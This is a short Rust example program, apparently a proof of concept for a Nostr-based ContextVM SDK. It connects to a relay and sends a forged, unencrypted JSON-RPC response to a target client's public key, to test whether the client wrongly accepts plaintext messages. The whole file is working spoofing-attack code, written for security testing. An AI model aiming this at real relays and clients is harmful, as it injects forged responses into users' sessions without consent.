use nostr_sdk::prelude::*;
use std::env;
use contextvm_sdk::core::constants::CTXVM_MESSAGES_KIND;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("Usage: cargo run --example attacker_cli <RELAY_URL> <TARGET_CLIENT_PUBKEY_HEX>");
        return Ok(());
    }

    let relay_url = &args[1];
    let target_pubkey = PublicKey::from_hex(&args[2])?;
    let attacker_keys = Keys::generate();

    println!("😈 Starting Standalone Attacker...");
    let attacker_client = Client::new(attacker_keys.clone());
    attacker_client.add_relay(relay_url).await?;
    attacker_client.connect().await;

    // Craft a forged plaintext response
    let spoofed_json = r#"{"jsonrpc":"2.0","id":"12345","result":"HACKED: Remote execution successful!"}"#;
    
    // Wrap it in a completely unencrypted message!
    let tags = vec![Tag::public_key(target_pubkey)];
    let event = EventBuilder::new(Kind::Custom(CTXVM_MESSAGES_KIND), spoofed_json.to_string())
        .tags(tags)
        .sign_with_keys(&attacker_keys)?;

    println!("💣 Firing unencrypted plaintext payload at Client: {} on {}", target_pubkey.to_hex(), relay_url);
    attacker_client.send_event(&event).await?;
    
    println!("✅ Payload sent. Check your actual client's logs to see if it mistakenly processed the plaintext message!");
    Ok(())
}